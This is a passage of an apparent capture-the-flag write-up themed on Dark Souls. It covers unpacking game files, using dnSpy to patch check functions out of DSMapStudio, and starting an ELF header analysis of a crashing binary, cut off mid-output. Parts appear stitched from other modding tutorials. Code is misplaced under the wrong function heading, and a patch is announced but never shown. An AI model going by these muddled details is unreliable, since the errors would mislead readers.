world does not.\r\n\r\n\r\n## **Cinder of the Rogue Machine**\r\n\r\nA smoldering ember taken from a dormant construct.\r\nIt mutters in recursive tones, as if trying to recall a name long lost.\r\nIt burns not with flame, but with computation.\r\n\r\n\r\n\r\n## **Bone of the Lost Reflection**\r\n\r\nA pale remnant from a body that never fully resolved.\r\nIts surface trembles with faint afterimages of a kneeling figure.\r\nSome say it holds her final memory.\r\n\r\n\r\n\r\n## **Objective**\r\n\r\nRecover the three fragments hidden across the provided materials.\r\nReconstruct the forgotten path of the unbound Firekeeper.\r\nAssemble the final key where a bonfire should have been, but never was.\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n#  **Solution**\r\n\r\n\r\n# PART-1\r\n\r\n**Challenge:** We are given a Havoc Engine dump file.\r\n**Objective:** Locate the Firekeeper.\r\n\r\n\r\n\r\n## Initial Analysis\r\n\r\nWe are provided with a large set of files from the game dump. To start, it’s crucial to understand and reverse-engineer the **Havoc Engine** and how it loads the game’s proprietary formats.\r\n\r\nFromSoftware uses custom, proprietary files for game data. As a result, traditional tools may not work directly, and you’ll often need your own utilities to parse or modify these files.\r\n\r\n**Notes:**\r\n\r\n* Tutorials for **Dark Souls Map Studio** generally apply to **Smithbox**, although some UI elements and workflows have changed.\r\n* Older tutorials use **Yabber**, which is now outdated and may cause problems. Instead, you should use [**WitchyBND**](https://github.com/ividyon/WitchyBND/releases), which works similarly for most users.\r\n\r\n\r\n\r\n## Modding Considerations\r\n\r\nIt’s important to note that **FromSoftware games were never designed to be modded**.\r\n\r\nThere are primarily two types of mods that can be loaded via mod loaders: **DLL mods** and **file replacement mods**.\r\n\r\n### DLL Mods\r\n\r\n* Contain primarily a `.dll` file.\r\n* May also include configuration files (`.ini`) or other required resources.\r\n* Modify game memory directly, enabling effects that file replacement mods cannot achieve.\r\n* Example: **Seamless Co-op**.\r\n\r\n  * Although it has its own folder and launcher, it can still be loaded via mod loaders alongside other mods.\r\n\r\n### File Replacement Mods\r\n\r\n* Consist of modified versions of the game’s internal files.\r\n* Common files and folders involved:\r\n\r\n  * `regulation.bin`, `data0.bdt`\r\n  * Directories: `chr`, `parts`, `map`, `event`, `msg`, `menu`, `script`, `param`\r\n* These mods replace in-game assets or behavior without directly modifying memory.\r\n\r\n\r\n## Approach\r\n\r\n1. **Explore the dump:**\r\n\r\n   * Identify file types relevant to the Firekeeper (maps, characters, events).\r\n2. **Reverse Havoc Engine formats:**\r\n\r\n   * Understand how `.bdt`, `.param`, `.event` and other proprietary files are loaded.\r\n3. **Use proper tools:**\r\n\r\n   * **WitchyBND** for extracting and modifying BND archives.\r\n   * **Smithbox** for map-related analysis.\r\n4. **Locate the Firekeeper:**\r\n\r\n   * Track character spawn data, event scripts, and map files to pinpoint her location.\r\n\r\n\r\n\r\n## Understanding file structure for file replacement mods \r\n\r\nThis is one of the most critical aspects of using mods, and something that many users get wrong.\r\n\r\n  \r\n\r\nBasically, all mod loaders expect the mod files that you add to be in a very specific structure, which mirrors the same structure used internally by the game. \r\n\r\n  \r\n\r\nFor example, below are screenshots of Clever’s Moveset Modpack being added both correctly and incorrectly to the Mod Engine 2 “mod” folder. This example is applicable to any other mod loader and game, not just ME2 and Elden Ring \r\n\r\n\r\n\r\n![File structure example](/images/posts/havok-engine-reverse-engineering/image-1.png)\r\n\r\n\r\nThis is correct and will work, because all these folders and the regulation.bin file are things that the mod loader is looking for, being part of the game’s internal file structure, and they are placed directly in the “mod” folder. In the case of ME3, it would be the equivalent “eldenring-mods” folder by default.\r\n\r\nBefore starting it it's important to identify what Game version the files are in ie # How to Identify the Game Version (Patch) a Mod Uses\r\n\r\n\r\n\r\n\r\n| **Category**             | **Parameter**           | **Description**                                                                                                               |\r\n| ------------------------ | ----------------------- | ----------------------------------------------------------------------------------------------------------------------------- |\r\n| **Game Parameters**      | AIStandardInfoBank      | Determines the parameters for enemy AI                                                                                        |\r\n|                          | AtkParam                | Determines hitbox and damage parameters for attacks                                                                           |\r\n|                          | BehaviorParam           | Determines behavior parameters for triggering projectiles and attacks                                                         |\r\n|                          | Bullet                  | Determines parameters of projectiles                                                                                          |\r\n|                          | CalcCorrectGraph        | Handles value curve functions for various mechanics                                                                           |\r\n|                          | CharaInitParam          | Determines loadout parameters for Armored Core type characters                                                                |\r\n|                          | CoolTimeParam           | Determines cooldowns (abilities, actions, etc.)                                                                               |\r\n|                          | EnemyBehaviorBank       | Parameters for enemy behavior and collision                                                                                   |\r\n|                          | EquipMtrlSetParam       | Material costs for various transactions                                                                                       |\r\n|                          | EquipParamAccessory     | Parameters for accessories                                                                                                    |\r\n|                          | EquipParamGoods         | Parameters for goods                                                                                                          |\r\n|                          | EquipParamProtector     | Parameters for equipment/armor                                                                                                |\r\n|                          | EquipParamWeapon        | Defines weapon types and affinities; affects scaling on consumables; special effects can be modified via ReinforceParamWeapon |\r\n|                          | FaceGenParam            | Configuration of NPC faces                                                                                                    |\r\n|                          | GameAreaParam           | Determines soul and humanity drops upon boss victories                                                                        |\r\n|                          | HitMtrlParam            | Parameters applied when hitting various materials                                                                             |\r\n|                          | ItemLotParam            | Determines contents of treasures and item rewards                                                                             |\r\n|                          | KnockBackParam          | Parameters relating to knockback                                                                                              |\r\n|                          | LevelSyncParam          | Parameters for level synchronization                                                                                          |\r\n|                          | LockCamParam            | Parameters for player cameras                                                                                                 |\r\n|                          | Magic                   | Configuration of magic spells                                                                                                 |\r\n|                          | MenuColorTableParam     | Coloring used for various interface elements                                                                                  |\r\n|                          | MoveParam               | Parameters for movement                                                                                                       |\r\n|                          | NpcParam                | Parameters for enemy characters                                                                                               |\r\n|                          | NpcThinkParam           | Parameters for enemy AI thinking/decision making                                                                              |\r\n|                          | ObjActParam             | Parameters for object interactions                                                                                            |\r\n|                          | ObjectParam             | Parameters for objects                                                                                                        |\r\n|                          | QwcChange               | Parameters for world tendency changes                                                                                         |\r\n|                          | QwcJudge                | Parameters for world tendency effects                                                                                         |\r\n|                          | RagdollParam            | Parameters for ragdolls                                                                                                       |\r\n|                          | ReinforceParamProtector | Parameters for reinforcing armor                                                                                              |\r\n|                          | ReinforceParamWeapon    | Parameters for reinforcing weapons                                                                                            |\r\n|                          | ShopLineupParam         | Parameters for shops                                                                                                          |\r\n|                          | SkeletonParam           | Parameters for character skeleton and foot IK                                                                                 |\r\n|                          | SpEffectParam           | Parameters for special effects                                                                                                |\r\n|                          | SpEffectVfxParam        | Parameters for particles triggered via SpEffect                                                                               |\r\n|                          | TalkParam               | Parameters for character dialogues                                                                                            |\r\n|                          | ThrowParam              | Parameters for throws                                                                                                         |\r\n|                          | WhiteCoolTimeParam      | Parameters for friendly phantoms cooldowns                                                                                    |\r\n| **Graphical Parameters** | DofBank                 | Parameters for depth of field assignments                                                                                     |\r\n|                          | EnvLightTexBank         | Parameters for environmental lighting textures                                                                                |\r\n|                          | FogBank                 | Parameters for fog volumes                                                                                                    |\r\n|                          | LensFlareBank           | Parameters for lens flares                                                                                                    |\r\n|                          | LensFlareExBank         | Parameters for lens flares                                                                                                    |\r\n|                          | LightBank               | Parameters for light maps                                                                                                     |\r\n|                          | LightScatteringBank     | Parameters for light scattering                                                                                               |\r\n|                          | LodBank                 | Parameters for levels of detail                                                                                               |\r\n|                          | PointLightBank          | Parameters for point lights                                                                                                   |\r\n|                          | ShadowBank              | Parameters for shadow maps                                                                                                    |\r\n|                          | ToneMapBank             | Parameters for tone maps                                                                                                      |\r\n\r\n---\r\nFirst, start by **unpacking the game using UXM**. UXM allows you to patch the executable so the game can load loose files instead of reading directly from the packed archives. This is crucial because it enables file-level modding without permanently altering the original archives. After downloading UXM from its GitHub repository, select the game you want to mod (DS1, DS2, SotFS, DS3, or Sekiro) and let UXM unpack all game assets into a folder. The tool will also automatically patch the game executable, so it references the unpacked loose files during runtime.\r\n\r\nOnce the game is unpacked, the next step is to **inspect and edit the PARAM files using WitchyBND**. WitchyBND is specifically designed to handle FromSoftware’s archive formats, allowing you to unpack and repack .bnd and .parambnd files. Open WitchyBND, load the relevant .parambnd files from the unpacked game folder, and explore the various PARAM tables such as AtkParam, MoveParam, EquipParamWeapon, or NpcParam. Each table corresponds to different gameplay mechanics—attacks, movement, weapon properties, enemy behaviors, and so on. You can modify numeric values, affinities, cooldowns, or other parameters directly within the tool.\r\n\r\nAfter making edits, you need to **repack the PARAM files** with WitchyBND so the game can read your modified values. It’s important to always back up the original PARAM files before making changes, in case anything breaks. Start by testing small modifications, such as adjusting one weapon’s stats or a single enemy parameter, to ensure the changes work as intended. Once you verify your edits, you can expand to more comprehensive adjustments, gradually customizing gameplay mechanics according to your design goals.\r\n\r\nThis workflow—unpacking with UXM, editing with WitchyBND, and repacking for testing creates a clean and manageable process for modding. The table of PARAM descriptions you prepared earlier serves as a quick reference for identifying which parameters to modify and which to leave untouched, helping you avoid unintended side effects while modding complex systems like AI behavior, weapon affinities, or environmental effects.\r\n\r\n---\r\nThis method allows you to **force object textures to load in any map** for both PTDE and Remastered editions of Dark Souls. Normally, objects like bonfires or corpses already exist in multiple maps, so this technique isn’t required for them. However, for objects that appear in only one map and usually grab textures from that specific map rather than their own .bnd, this method ensures that they display correctly in other locations. Be aware that this process is a bit tedious and requires careful handling of multiple files.\r\n\r\nBefore you start, you will need the following tools: **Yabber** (for unpacking/repacking .bnd and .tpf files), a **Flver Editor** (for viewing and editing .flver model files), and the **unpacked game files**. Make sure you have these ready.\r\n\r\nStart by locating the `.objbnd` file of the object you want to modify inside the `\\obj\\` folder of the unpacked game files. Use Yabber to unpack it, then locate the `.flver` model file for the object within the unpacked folder. Open this `.flver` file in the Flver Editor, and in the **FLVER Bones window**, click on “Material.”\r\n\r\nSelect the material in the first index `[0]` and click “Edit” to open the material quick editor window. Here, you will usually see **three texture paths** corresponding to the diffuse, specular (`_s`), and bump map (`_n`) textures. The paths indicate which map folder the textures are stored in, e.g., `\\m10\\`, `\\m11\\`, etc.\r\n\r\nNext, navigate to the \\map\\ folder in the unpacked game files and locate the folder corresponding to the map that contains the textures you want. Within this folder, textures are stored inside .tpfbhd archives labeled like mXX_000X.tpfbhd. Unpack all relevant .tpfbhd files, then search for the .tpf files referenced in your material paths (note that these are .tpf, not .tga). Repeat this process for each material index on your model, as some models use multiple materials.\r\n\r\nOnce all necessary `.tpf` files are extracted, create a **new folder** to consolidate them. It’s helpful to name this folder after your object for organization. For each additional extracted folder, copy the `.dds` files into your new `.tpf` folder. Then, open the `_yabber-tpf.xml` file from each source folder, copy the segment between `\u003Ctexture>` and `\u003C/texture>`, and paste it into your new `.xml` file inside the `\u003Ctextures>` section, immediately after the last texture entry.\r\n\r\nAfter combining all textures and XML entries, move your new .tpf folder, containing both the .dds files and the updated .xml, into the .objbnd folder alongside the .flver model file. Use Yabber to repack this folder into a .tpf or .tpf.dcx file. For Remastered editions, convert .tpf.dcx back into a plain .tpf using Yabber DCX.\r\n\r\nFinally, edit the _yabber-bnd3.xml for the .objbnd and **add your new .tpf file**, making sure its **ID is set to 100**, as this is required for it to work correctly. Repack the .objbnd with Yabber and test it in-game. If done correctly, the object should now load its textures in any map.\r\n\r\n\r\n\r\n\r\n## Now onto the main DS-MAP Studio  \r\n\r\n\r\nNow we’ll use **dnSpy** to reverse engineer the **mod loader** so we can adapt it for our **custom map**. Since advanced techniques like **DLL injection** into the **PTSR Havoc engine** or creating a **modloader.ini** are beyond the scope of this writeup, we’ll focus on directly **modifying the existing map studio executable** instead.\r\n\r\n**dnSpy** is a powerful .NET debugger and decompiler commonly used in reverse engineering CTF challenges to inspect, edit, and recompile compiled .exe files built with C#. It allows us to open the target executable, decompile it into readable C# code, and explore its internal logic—such as how it loads maps or verifies inputs. Using dnSpy, we can identify and edit key functions that control map loading or validation, patch conditions to always succeed, and embed our own custom behavior. Once modified, dnSpy lets us recompile and save the patched binary, effectively turning the original map studio into a **customized mod loader** that supports our own maps without external injection or configuration files.\r\n\r\n\r\n\r\n![dnSpy CheckProgramUpdate function](/images/posts/havok-engine-reverse-engineering/image-2.png)\r\n\r\n\r\n\r\n\r\nThe function CheckProgramUpdate() is responsible for checking for new releases of DSMapStudio by querying GitHub. It creates a GitHubClient instance, fetches the latest release from the soulsmods/DSMapStudio repository, extracts the version number from the tag, and compares it against the local version stored in this._version. If the remote version is newer, it sets _programUpdateAvailable to true and stores the release URL, which later triggers an update prompt inside the application. For a customized or offline build, this behavior is unnecessary and can cause unwanted network requests or popups.\r\n\r\n![Patched CheckProgramUpdate](/images/posts/havok-engine-reverse-engineering/image-3.png)\r\n\r\nTo disable this check, we can patch the method using dnSpy. After opening the executable in dnSpy, navigate to the method under its containing class, right-click it, and select Edit Method (C#). We then replace the entire body of the function with a minimal stub that does nothing. For example:\r\n\r\nprivate void CheckProgramUpdate()\r\n{\r\n    return;\r\n}\r\n\r\n\r\nThis patch ensures that the method exits immediately without performing any network calls or version comparisons. Alternatively, you can explicitly set the update variables to safe defaults:\r\n\r\n\r\nAlso GameNotUnpackedWarning is a function that checks that is the custom mod , (Dark Souls 1 PTDE unpacking check)\r\n\r\n\r\n```c#\r\n\r\n\t\t// Token: 0x0600002F RID: 47 RVA: 0x00003054 File Offset: 0x00001254\r\n\t\tpublic AssetDescription GetMapMSB(string mapid, bool writemode = false)\r\n\t\t{\r\n\t\t\tAssetDescription ad = new AssetDescription();\r\n\t\t\tad.AssetPath = null;\r\n\t\t\tif (mapid.Length != 12)\r\n\t\t\t{\r\n\t\t\t\treturn ad;\r\n\t\t\t}\r\n\t\t\tstring preferredPath;\r\n\t\t\tstring backupPath;\r\n\t\t\tif (this.Type == GameType.DarkSoulsIISOTFS)\r\n\t\t\t{\r\n\t\t\t\tDefaultInterpolatedStringHandler defaultInterpolatedStringHandler = new DefaultInterpolatedStringHandler(9, 2);\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendLiteral(\"map\\\\\");\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendFormatted(mapid);\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendLiteral(\"\\\\\");\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendFormatted(mapid);\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendLiteral(\".msb\");\r\n\t\t\t\tpreferredPath = defaultInterpolatedStringHandler.ToStringAndClear();\r\n\t\t\t\tdefaultInterpolatedStringHandler = new DefaultInterpolatedStringHandler(9, 2);\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendLiteral(\"map\\\\\");\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendFormatted(mapid);\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendLiteral(\"\\\\\");\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendFormatted(mapid);\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendLiteral(\".msb\");\r\n\t\t\t\tbackupPath = defaultInterpolatedStringHandler.ToStringAndClear();\r\n\t\t\t}\r\n\t\t\telse if (this.Type == GameType.Bloodborne && mapid.StartsWith(\"m29\"))\r\n\t\t\t{\r\n\t\t\t\tDefaultInterpolatedStringHandler defaultInterpolatedStringHandler = new DefaultInterpolatedStringHandler(27, 2);\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendLiteral(\"\\\\map\\\\MapStudio\\\\\");\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendFormatted(mapid.Substring(0, 9));\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendLiteral(\"_00\\\\\");\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendFormatted(mapid);\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendLiteral(\".msb.dcx\");\r\n\t\t\t\tpreferredPath = defaultInterpolatedStringHandler.ToStringAndClear();\r\n\t\t\t\tdefaultInterpolatedStringHandler = new DefaultInterpolatedStringHandler(23, 2);\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendLiteral(\"\\\\map\\\\MapStudio\\\\\");\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendFormatted(mapid.Substring(0, 9));\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendLiteral(\"_00\\\\\");\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendFormatted(mapid);\r\n\t\t\t\tdefaultInterpolatedStringHandler.AppendLiteral(\".msb\");\r\n\t\t\t\tbackupPath = defaultInterpolatedStringHandler.ToStringAndClear();\r\n\t\t\t}\r\n\t\t\telse if (this.Type == GameType.DarkSoulsPTDE || this.Type == GameType.DarkSoulsRemastered || this.Type == GameType.DemonsSouls)\r\n\t\t\t{\r\n\t\t\t\tpreferredPath = \"\\\\map\\\\MapStudio\\\\\" + mapid + \".msb\";\r\n\t\t\t\tbackupPath = \"\\\\map\\\\MapStudio\\\\\" + mapid + \".msb.dcx\";\r\n\t\t\t}\r\n\t\t\telse if (this.Type == GameType.Bloodborne || this.Type == GameType.DarkSoulsIII || this.Type == GameType.EldenRing || this.Type == GameType.Sekiro)\r\n\t\t\t{\r\n\t\t\t\tpreferredPath = \"\\\\map\\\\MapStudio\\\\\" + mapid + \".msb.dcx\";\r\n\t\t\t\tbackupPath = \"\\\\map\\\\MapStudio\\\\\" + mapid + \".msb\";\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tpreferredPath = \"\\\\map\\\\MapStudio\\\\\" + mapid + \".msb.dcx\";\r\n\t\t\t\tbackupPath = \"\\\\map\\\\MapStudio\\\\\" + mapid + \".msb\";\r\n\t\t\t}\r\n\t\t\tif ((this.GameModDirectory != null && File.Exists(this.GameModDirectory + \"\\\\\" + preferredPath)) || (writemode && this.GameModDirectory != null))\r\n\t\t\t{\r\n\t\t\t\tad.AssetPath = this.GameModDirectory + \"\\\\\" + preferredPath;\r\n\t\t\t}\r\n\t\t\telse if ((this.GameModDirectory != null && File.Exists(this.GameModDirectory + \"\\\\\" + backupPath)) || (writemode && this.GameModDirectory != null))\r\n\t\t\t{\r\n\t\t\t\tad.AssetPath = this.GameModDirectory + \"\\\\\" + backupPath;\r\n\t\t\t}\r\n\t\t\telse if (File.Exists(this.GameRootDirectory + \"\\\\\" + preferredPath))\r\n\t\t\t{\r\n\t\t\t\tad.AssetPath = this.GameRootDirectory + \"\\\\\" + preferredPath;\r\n\t\t\t}\r\n\t\t\telse if (File.Exists(this.GameRootDirectory + \"\\\\\" + backupPath))\r\n\t\t\t{\r\n\t\t\t\tad.AssetPath = this.GameRootDirectory + \"\\\\\" + backupPath;\r\n\t\t\t}\r\n\t\t\tad.AssetName = mapid;\r\n\t\t\treturn ad;\r\n\t\t}\r\n```\r\n\r\n\r\n\r\n\r\n\r\n## Patched Version:\r\n\r\n```csharp\r\nprivate bool GameNotUnpackedWarning(GameType gameType)\r\n{\r\n    // Patch: Skip check for Dark Souls 1 PTDE (for custom map development)\r\n    if (gameType == GameType.DarkSoulsPTDE)\r\n    {\r\n        return true; // Allow operation without warning\r\n    }\r\n    \r\n    // Keep original check for DS2:SOTFS\r\n    if (gameType == GameType.DarkSoulsIISOTFS)\r\n    {\r\n        TaskLogs.AddLog(\r\n            $\"The files for {gameType} do not appear to be unpacked. Please use UXM for DS2 to unpack game files\",\r\n            LogLevel.Error,\r\n            TaskLogs.LogPriority.High,\r\n            null\r\n        );\r\n        return false;\r\n    }\r\n    \r\n    TaskLogs.AddLog(\r\n        $\"The files for {gameType} do not appear to be fully unpacked. Functionality will be limited. Please use UXM selective unpacker to unpack game files\",\r\n        LogLevel.Warning,\r\n        TaskLogs.LogPriority.Normal,\r\n        null\r\n    );\r\n    return true;\r\n}\r\n```\r\n\r\n##  Remove All Checks for DS1\r\n\r\n\r\n\r\n```csharp\r\nprivate bool GameNotUnpackedWarning(GameType gameType)\r\n{\r\n    // Patch: Bypass unpacking checks for custom DS1 map development\r\n    if (gameType == GameType.DarkSoulsPTDE)\r\n    {\r\n        return true;\r\n    }\r\n    \r\n    // Original code for other games\r\n    bool flag = gameType == GameType.DarkSoulsIISOTFS;\r\n    if (flag)\r\n    {\r\n        TaskLogs.AddLog(\r\n            $\"The files for {gameType} do not appear to be unpacked. Please use UXM for DS2 to unpack game files\",\r\n            LogLevel.Error,\r\n            TaskLogs.LogPriority.High,\r\n            null\r\n        );\r\n        return false;\r\n    }\r\n    \r\n    TaskLogs.AddLog(\r\n        $\"The files for {gameType} do not appear to be fully unpacked. Functionality will be limited. Please use UXM selective unpacker to unpack game files\",\r\n        LogLevel.Warning,\r\n        TaskLogs.LogPriority.Normal,\r\n        null\r\n    );\r\n    return true;\r\n}\r\n```\r\n\r\nThis will let our custom DS1 map work without the unpacking requirement .\r\n\r\nAnother function we need to look out for is \r\n\r\n```csharp\r\n// Token: 0x060003F8 RID: 1016 RVA: 0x00033C94 File Offset: 0x00031E94\r\n\t\tprivate void LoadVParamsDS1()\r\n\t\t{\r\n\t\t\tthis.LoadParamsDS1FromFile(this.AssetLocator.GameRootDirectory + \"\\\\param\\\\GameParam\\\\GameParam.parambnd\");\r\n\t\t\tif (Directory.Exists(this.AssetLocator.GameRootDirectory + \"\\\\param\\\\DrawParam\"))\r\n\t\t\t{\r\n\t\t\t\tforeach (string p in Directory.GetFiles(this.AssetLocator.GameRootDirectory + \"\\\\param\\\\DrawParam\", \"*.parambnd\"))\r\n\t\t\t\t{\r\n\t\t\t\t\tthis.LoadParamsDS1FromFile(p);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n```\r\n\r\n```csharp\r\nprivate void LoadVParamsDS1()\r\n{\r\n    // Params not needed for custom map development\r\n}\r\n```\r\n\r\nThe simplest approach is just returning immediately - this completely bypasses all param loading without any checks or error handling. This is typically what you want for custom map development where params aren't required.\r\nMap studio operates on top of something I call mod projects. These are typically stored in a separate directory from the base game, and all modifies files will be saved there instead of overwriting the base game files. The intended workflow is to install mod engine for your respective game and set the modoverridedirectory in modengine.ini to your mod project directory. This way you don't have to modify base game files (and work on multiple mod projects at a time) and you can easily distribute a mod by zipping up the project directory and uploading it.\r\n\r\n\r\n\r\nMoving Forward: Editing the Maps\r\nWith the technical barriers removed, we are  now ready to start actual map editing work. The map system is my gateway to working with Dark Souls 1's level files - it handles locating and loading the MapStudio Binary files that contain all the map data.\r\n\r\n\r\nOn why we use DS mapstudio for solving this instead of something like unity to see assets ? \r\n\r\nthe bindings of Unity data structures to Souls ones grew very messy and buggy, and led to a very unintuitive user experience (i.e. most users can't intuitively know what Unity operations are actually supported by DSTools for export). Unity also doesn't provide sufficiently low level APIs for many of its useful subsystems like its lightmapper and navmesh generator, so making these subsystems work for Dark Souls range from painful to impossible\r\n\r\nAlso reading the file formatter for HAVOC we get , we get a diagram of the loader pipeline \r\n\r\n\r\n![Havok loader pipeline diagram](/images/posts/havok-engine-reverse-engineering/image-4.png)\r\n\r\n\r\n\r\n### Supported XML classes\r\nhkRootLevelContainer\r\nhkaAnimationContainer\r\nhkaSkeleton\r\nhkaAnnotationTrack\r\nhkaInterleavedAnimation\r\nhkaAnimationBinding\r\nhkxEnvironment\r\n\r\n### Python wrapper classes\r\nhkRootLevelContainer\r\nhkaAnimationContainer\r\nhkaSkeleton\r\nhkxEnvironment\r\n\r\n### Binary export classes (v5 - v2014)\r\nhkRootLevelContainer (read-only)\r\nhkaAnimationContainer (read-only)\r\nhkaSkeleton (read-only)\r\nhkxEnvironment (read-only)\r\nhkNamedVariant\r\nhkaPartition\r\n\r\n\r\n\r\nThis is to understand what the GAME dump means to annotate and see what sections and options to be checked for , also we'd need a pugin to display the model GIZMOS , A map and model viewer for NinjaBlade/DeS/DS1/DS2/DS3/Bloodborne preferability  for fucntions like FLVER Model Parsing , MSB Map Layout Parsing , TPF / TPFBHD Texture Pack Parsing , PS4 Texture Headerization , DX11 Texture Support Patch to MonoGame, Binder & DCX Container Parsing , HKX Collision Parsing(collision meshes, ragdoll setups, and physics constraints) , \r\n\r\n![DS Map Studio view 1](/images/posts/havok-engine-reverse-engineering/image-5.png)\r\n\r\n\r\nSince we dont know what model id refers to the Firekeeper model , we can see the Drawparams which takes arguments and passes it into the model's \r\n\r\n\r\n![DS Map Studio DrawParams](/images/posts/havok-engine-reverse-engineering/image-6.png)\r\n\r\n\r\nThe text is in japaneese so are the original functions in . so we have to refer a Language dump online for Darksouls 1 and get the charIDred as reference , The reason why we are doing this is , NPc's have interaction navmeshes (to put it simply) \r\nSimple in theory, but it does seem painful to get right. I use A* to identify the nodes (individual polygons), then used the funnel algorithm to actually map out the detailed path [NAVMESH](https://github.com/recastnavigation/recastnavigation)\r\n\r\n![Language dump reference](/images/posts/havok-engine-reverse-engineering/image-7.png)\r\n\r\n\r\nAfter cross referencing we get to the mappeice which has the asset , we we are doing this is because NPC's have set game flags to move from one location to anbother and they behave as different entities depending on the flag bits set to them . In order to avoid the hassble FROMSOFTWARE uses multiple ID's but refer them under the game AI for the template charectarestics .\r\n\r\nNow lets start looking at the model editor to see for NPC's  : ) \r\n\r\n\r\n![Model editor view](/images/posts/havok-engine-reverse-engineering/image-8.png)\r\n\r\nI'll remove the lightfilter becuase it's annoying to see through \r\n\r\n![Light filter removed](/images/posts/havok-engine-reverse-engineering/image-9.png)\r\n\r\n\r\nAnd then we find the dialouge in the current setted mappeice to the position DEX \r\n\r\n\r\n![Dialogue position DEX](/images/posts/havok-engine-reverse-engineering/image-10.png)\r\n\r\n\r\nAfter scrolling and peedking the area we find the model : )\r\n\r\n\r\n![Firekeeper model found](/images/posts/havok-engine-reverse-engineering/image-11.png)\r\n\r\n\r\n### THE VALUES FOR THE MODEL ID AND THE LOCATION ARE THE FLAG BITS \r\n\r\n\r\n\r\n\r\n# PART-2\r\n\r\n##  Identifying  Binary Characteristics\r\n\r\n\r\n**Running the binary:**\r\n```bash\r\n./rust_vm_poc_mangled\r\n```\r\n\r\n**Result:**\r\n```\r\nzsh: segmentation fault  ./rust_vm_poc_mangled\r\n```\r\n\r\nThe binary crashes immediately with a segmentation fault before any visible execution.\r\n\r\n---\r\n\r\n### File Analysis\r\n\r\n```bash\r\nfile rust_vm_poc_mangled\r\n```\r\n\r\n**Output:**\r\n```\r\nrust_vm_poc_mangled: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), \r\nstatically linked, for GNU/Linux 3.10.0, stripped\r\n```\r\n\r\n**Key observations:**\r\n- **64-bit ELF executable** - Standard Linux binary format\r\n- **PIE (Position Independent Executable)** - Uses ASLR (Address Space Layout Randomization)\r\n- **Statically linked** - All dependencies are compiled into the binary (no external shared libraries needed)\r\n- **Stripped** - Debug symbols removed, making analysis harder\r\n- Built for **GNU/Linux 3.10.0** or higher\r\n\r\n---\r\n\r\n### Strings Analysis\r\n\r\n```bash\r\nstrings rust_vm_poc_mangled\r\n```\r\n\r\n**Critical Finding - Python C API Symbols:**\r\n\r\nThe binary contains numerous Python C API function references:\r\n```\r\nPyErr_PrintEx\r\nPyBytes_AsString\r\nPyObject_GetAttr\r\nPyImport_ExecCodeModuleEx\r\nPyUnicode_AsUTF8AndSize\r\nPyModule_Type\r\nPyTuple_New\r\nPyType_GetFlags\r\nPyGILState_Ensure\r\nPyErr_SetRaisedException\r\nPy_InitializeEx\r\nPy_CompileString\r\nPyEval_SaveThread\r\nPyGILState_Release\r\nPy_IsInitialized\r\n```\r\n\r\n**Other notable strings:**\r\n```\r\nnix/store/776irwlgfb65a782cxmyk61pck460fs9-glibc-2.40-66/lib/ld-linux-x86-64.so.2\r\n__gmon_start__\r\n_ITM_deregisterTMCloneTable\r\n_ITM_registerTMCloneTable\r\n_Unwind_GetLanguageSpecificData\r\n```\r\n\r\n---\r\n\r\nNow the obvious out of the way  , when a binary crashes immediately upon execution, before reaching main(), it often means the problem occurs during the operating system’s loading stage. The OS loader begins by reading the ELF header and then the program headers, which describe how to map the binary’s segments into memory-defining their file offsets, virtual addresses, sizes, and permissions. If these program headers are corrupted, the loader will attempt to create invalid memory mappings, leading to a page fault and an instant segmentation fault. Since this happens before the program even starts executing, normal debugging tools are useless at this stage : ( \r\n\r\nWhen you run an executable, the OS loader is invoked first. It looks at the list of program headers in the ELF file. It's mainly interested in the ones marked PT_LOAD.\r\n\r\nEach PT_LOAD header is a simple instruction with four critical parts:\r\n\r\n    File Offset: Where in the executable file the data starts (e.g., byte 0).\r\n\r\n    File Size: How much data to take from the file (e.g., 40 kilobytes).\r\n\r\n    Virtual Address: Where this data should be placed in the process's virtual memory (e.g., at address 0x400000).\r\n\r\n    Permissions: What the program is allowed to do there (Read, Write, Execute).\r\n\r\nA typical binary has at least two PT_LOAD segments:\r\n\r\n    The Code Segment (.text): Has Read + Execute permissions. The loader maps the part of the file containing machine code here.\r\n\r\n    The Data Segment (.data, .bss): Has Read + Write permissions. The loader maps the part of the file containing initialized global variables and reserves space for uninitialized ones.\r\n\r\nThe loader reads these instructions and tells the kernel (via the mmap system call) to set up these memory mappings. The kernel creates the necessary structures to manage this new virtual address space. Only then does the loader transfer control to your program's entry point.\r\n\r\n\r\n\r\nWhen analyzing the binary `rust_vm_poc_mangled`, the first step is to inspect its ELF structure using `readelf -h rust_vm_poc_mangled`. The output reveals the following critical details:\r\n\r\n```\r\nELF Header:\r\n  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 \r\n  Class:                             ELF64\r\n  Data:                              2's complement, little endian\r\n  Version:                           1 (current)\r\n  OS/ABI:                            UNIX - System V\r\n  ABI Version:                       0\r\n  Type:                              DYN (Shared object file)\r\n  Machine:                           Advanced Micro Devices X86-64\r\n  Version:                           0x1\r\n  Entry point address:               0xf250\r\n  Start of program headers:          0 (bytes into file)\r\n  Start of section headers:          523080 (bytes into file)\r\n  Flags:                             0x0\r\n  Size of this header:               64 (bytes)\r\n  Size of program headers:           56 (bytes)\r\n  Number of program 